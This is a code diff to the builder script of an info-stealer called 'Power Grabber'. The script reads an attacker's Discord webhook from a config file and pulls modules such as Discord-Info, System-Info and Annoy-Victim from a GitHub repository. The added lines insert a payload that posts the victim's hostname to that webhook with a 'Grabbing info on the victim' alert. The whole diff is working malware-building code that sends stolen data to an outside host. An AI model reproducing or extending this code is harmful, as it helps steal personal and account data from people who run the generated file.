@@ -33,6 +33,39 @@ with open('config.txt', 'r') as config_file:
         if line.startswith("Webhook:"):
             webhook_url = line.split("Webhook:")[1].strip()
             break
+with open('config.txt', 'r') as config_file:
+    for line in config_file:
+        if line.startswith("Ping:"):
+            ping_value = line.split("Ping:")[1].strip()
+            break
+if ping_value == "None":
+    ping_message = ""
+elif ping_value == "Here":
+    ping_message = "'@here'"
+elif ping_value == "Everyone":
+    ping_message = "'@everyone'"
+else:
+    ping_message = ""
+ping = """
+import requests
+import socket
+hostname = socket.gethostname()
+data = {
+    "content": ping_message,
+    "embeds": [
+        {
+            "title": "Power Grabber Notification",
+            "description": f"{hostname} ran the file! Grabbing info on the victim...",
+            "color": 0x8B0000
+        }
+    ]
+}
+response = requests.post(webhook_url, json=data)
+if response.status_code == 204:
+    pass
+else:
+    pass
+"""
 combined_code = ""
 if 'Annoy-Victim' in features:
     annoy_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Annoy.py').text.strip()
@@ -67,6 +100,6 @@ if 'System-Info' in features:
 if 'Discord-Info' in features:
     discord_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Discord-Info.py').text.strip()
     combined_code += discord_code + "\n" if discord_code else ""
-final_code = f"webhook_url = {webhook_url}\n" + "\n".join(filter(None, combined_code.splitlines()))
+final_code = f"webhook_url = {webhook_url}\nping_message = {ping_message}\n{ping}" + "\n".join(filter(None, combined_code.splitlines()))
 with open(filename, 'w', encoding='utf-8') as grabber_file:
     grabber_file.write(final_code)
